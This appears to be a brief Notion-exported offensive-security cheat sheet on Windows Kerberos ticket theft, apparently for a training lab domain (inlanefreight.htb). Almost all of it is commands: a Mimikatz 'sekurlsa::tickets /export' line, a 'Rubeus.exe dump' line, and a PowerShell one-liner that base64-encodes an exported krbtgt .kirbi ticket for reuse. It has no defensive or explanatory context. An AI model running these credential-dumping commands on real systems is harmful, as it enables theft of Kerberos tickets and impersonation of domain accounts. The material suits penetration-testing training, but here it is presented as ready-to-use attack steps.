# Convert Kirbi to Base64

OS: Windows
Description: Convert Kirbi to Base64
Security Domains: Resource Development (https://www.notion.so/Resource-Development-1444c8e523768023b086cae715467df4?pvs=21)
Target_Technology: windows (https://www.notion.so/windows-1454c8e52376809bb701cef01e9f111a?pvs=21)

### Export Tickets from Mimikatz

```jsx
*sekurlsa*::tickets /export
```

### Rubeus

```jsx
Rubeus.exe dump /nowrap
```

### Convert Kirbi to base64

```jsx
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```